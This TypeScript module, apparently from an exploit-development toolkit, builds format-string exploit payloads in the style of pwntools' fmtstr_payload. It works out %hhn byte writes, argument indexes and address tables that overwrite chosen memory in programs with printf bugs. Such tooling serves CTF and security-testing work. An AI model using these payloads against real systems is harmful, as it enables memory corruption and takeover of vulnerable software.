import { toHex } from "./leak.js";
import { packWord } from "./rop.js";

/**
 * Deterministic format-string payload construction (pwntools fmtstr_payload
 * equivalent, byte-wise %hhn strategy). The layout math — alignment, argument
 * indexes, printed-count deltas — is mechanical and a classic source of
 * off-by-one payloads when done by hand, so it lives in a pure function here.
 */
export interface FmtstrWrite {
  address: bigint;
  value: bigint;
  /** Bytes of `value` to write, little-endian (default: full pointer width). */
  size?: number;
}

export interface FmtstrLayoutEntry {
  address: string;
  byte: number;
  argIndex: number;
  delta: number;
}

export interface FmtstrPayload {
  payloadHex: string;
  payloadBytes: number;
  layout: FmtstrLayoutEntry[];
  problems: string[];
}

export interface FmtstrOptions {
  /** First controlled printf argument index (pwntools `offset`). */
  offset: number;
  bits: 32 | 64;
  /** Literal bytes preceding the payload in the same format string (already aligned away). */
  prefix?: Buffer;
  /** Bytes that must never appear in the payload (address packing is checked). */
  badBytes?: Set<number>;
  maxPayload?: number;
}

export function buildFmtstrPayload(writes: FmtstrWrite[], options: FmtstrOptions): FmtstrPayload {
  const wordBytes = options.bits === 64 ? 8 : 4;
  const problems: string[] = [];
  if (!Number.isInteger(options.offset) || options.offset < 1 || options.offset > 4096) {
    problems.push(`offset ${options.offset} must be a bounded positive printf argument index`);
  }
  if (writes.length === 0) problems.push("at least one write is required");
  if (writes.length > 32) problems.push(`fmtstr writes are bounded at 32 targets, got ${writes.length}`);

  const prefix = options.prefix ?? Buffer.alloc(0);
  const maxPayload = options.maxPayload ?? 2_048;

  // Expand into individual byte writes, then order by value ascending so the
  // printed-count deltas stay small and monotone.
  interface Unit { address: bigint; byte: number; }
  const units: Unit[] = [];
  for (const write of writes) {
    const size = write.size ?? wordBytes;
    if (size < 1 || size > wordBytes) problems.push(`write size ${size} exceeds the ${wordBytes}-byte word`);
    for (let index = 0; index < size; index += 1) {
      units.push({ address: write.address + BigInt(index), byte: Number((write.value >> BigInt(index * 8)) & 0xffn) });
    }
  }
  units.sort((left, right) => left.byte - right.byte);

  // Two fixed-point passes: argument indexes depend on the directive length,
  // which depends on the indexes' decimal width.
  let directives = "";
  let layout: FmtstrLayoutEntry[] = [];
  for (let pass = 0; pass < 4; pass += 1) {
    const headBytes = prefix.length + directives.length;
    const tableStart = headBytes + ((wordBytes - (headBytes % wordBytes)) % wordBytes);
    let printed = prefix.length;
    let rebuilt = "";
    layout = [];
    units.forEach((unit, index) => {
      const argIndex = options.offset + (tableStart / wordBytes | 0) + index;
      const delta = ((unit.byte - (printed % 256)) % 256 + 256) % 256;
      const chunk = `${delta > 0 ? `%${delta}c` : ""}%${argIndex}$hhn`;
      printed += delta;
      rebuilt += chunk;
      layout.push({ address: toHex(unit.address), byte: unit.byte, argIndex, delta });
    });
    if (rebuilt === directives) break;
    directives = rebuilt;
  }

  const headBytes = prefix.length + directives.length;
  const padBytes = (wordBytes - (headBytes % wordBytes)) % wordBytes;
  const payload = Buffer.concat([
    prefix,
    Buffer.from(directives, "ascii"),
    Buffer.alloc(padBytes, 0x20), // alignment padding after the last directive prints harmlessly
    ...layout.map((entry) => packWord(BigInt(entry.address), wordBytes)),
  ]);

  if (payload.length > maxPayload) problems.push(`fmtstr payload is ${payload.length} bytes, exceeding the ${maxPayload}-byte bound`);
  if (options.badBytes?.size) {
    const hits = [...payload].filter((byte) => options.badBytes!.has(byte));
    if (hits.length > 0) problems.push(`format-string payload contains ${new Set(hits).size} distinct forbidden byte(s); shorten the offset or switch to %hn/%n groupings`);
  }
  return { payloadHex: payload.toString("hex"), payloadBytes: payload.length, layout, problems };
}
